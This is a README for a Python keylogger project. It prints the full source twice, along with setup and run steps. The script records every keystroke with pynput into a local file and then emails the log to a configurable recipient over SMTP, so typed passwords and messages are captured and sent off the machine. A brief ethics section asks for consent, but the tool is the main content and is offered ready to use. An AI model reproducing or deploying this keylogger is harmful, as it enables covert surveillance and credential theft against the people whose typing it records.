# Python-Keylogger-Project
Developed a basic keylogger in Python using the pynput library to capture and log keystrokes.
# Keylogger Project

## Purpose
This project is a demonstration of how to create a basic keylogger in Python using the `pynput` library. The keylogger captures and logs keystrokes to a file.



```markdown
# Keylogger Project

## Overview
This project demonstrates how to create a basic keylogger in Python using the `pynput` library. The keylogger captures and logs keystrokes to a file and can optionally send the log file via email.

## Features
- Logs alphanumeric and special keys
- Saves logs to a text file
- Optionally sends logs via email
- Includes setup instructions and usage guidelines
- Emphasizes ethical considerations

## Setup Instructions

### Prerequisites
- Python 3.x installed on your system. You can download it from [python.org](https://www.python.org/).

### Step-by-Step Guide

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/yourusername/python-keylogger.git
   cd python-keylogger
   ```

2. **Install Required Libraries**:
   Open a terminal and run the following command to install the required libraries:
   ```bash
   pip install pynput
   ```

3. **Keylogger Script**:
   Ensure your `keylogger.py` file contains the following code:

   ```python
   from pynput import keyboard
   import datetime
   import logging
   import smtplib
   from email.mime.multipart import MIMEMultipart
   from email.mime.text import MIMEText

   log_file = "key_log.txt"

   def on_press(key):
       try:
           with open(log_file, "a") as log:
               log.write(f"{datetime.datetime.now()} - {key.char}\n")
       except AttributeError:
           with open(log_file, "a") as log:
               log.write(f"{datetime.datetime.now()} - {key}\n")

   def on_release(key):
       if key == keyboard.Key.esc:
           return False

   with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
       listener.join()

   logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

   def on_press(key):
       try:
           logging.info(f"Key {key.char} pressed")
       except AttributeError:
           logging.info(f"Special Key {key} pressed")

   def send_email(log_content):
       from_addr = "your_email@example.com"
       to_addr = "destination_email@example.com"
       msg = MIMEMultipart()
       msg['From'] = from_addr
       msg['To'] = to_addr
       msg['Subject'] = "Keylogger Log"

       body = MIMEText(log_content, 'plain')
       msg.attach(body)

       server = smtplib.SMTP('smtp.example.com', 587)
       server.starttls()
       server.login(from_addr, "your_password")
       server.send_message(msg)
       server.quit()

   # Call send_email with the content of log file
   with open(log_file, "r") as file:
       send_email(file.read())
   ```

4. **Configure Email Settings**:
   - Replace `your_email@example.com` with your email address.
   - Replace `destination_email@example.com` with the recipient's email address.
   - Replace `smtp.example.com` with your email provider's SMTP server.
   - Replace `your_password` with your email account password.

5. **Run the Script**:
   Execute the script by running:
   ```bash
   python keylogger.py
   ```

6. **Test the Keylogger**:
   - Open any application and start typing.
   - Check the `key_log.txt` file in the same directory to see the logged keystrokes.
   - Press the `Esc` key to stop the keylogger and send the log via email.

## Usage Guidelines
1. **Run the Script**:
   - Open a terminal.
   - Navigate to the directory where `keylogger.py` is located.
   - Run the script with:
     ```bash
     python keylogger.py
     ```

2. **Stop the Keylogger**: Press the `Esc` key to stop the keylogger and send the log via email.

3. **View Logs**: The keystrokes are logged in the `key_log.txt` file in the same directory as the script.

## Ethical Considerations
- **Legal Usage**: Ensure that you have explicit permission from the user to log their keystrokes. Unauthorized use of a keylogger is illegal and unethical.
- **Privacy**: Respect the privacy of individuals. Use this tool responsibly and only for educational or authorized purposes.
- **Security**: Be aware of the potential security implications of running a keylogger. Ensure it is used in a controlled environment to prevent misuse.

## Example Code
```python
from pynput import keyboard
import datetime
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(f"{datetime.datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as log:
            log.write(f"{datetime.datetime.now()} - {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special Key {key} pressed")

def send_email(log_content):
    from_addr = "your_email@example.com"
    to_addr = "destination_email@example.com"
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = "Keylogger Log"

    body = MIMEText(log_content, 'plain')
    msg.attach(body)

    server = smtplib.SMTP('smtp.example.com', 587)
    server.starttls()
    server.login(from_addr, "your_password")
    server.send_message(msg)
    server.quit()

# Call send_email with the content of log file
with open(log_file, "r") as file:
    send_email(file.read())
```

## Contributing
Feel free to fork this repository and contribute by submitting pull requests.

## License
This project is licensed under the MIT License.
```


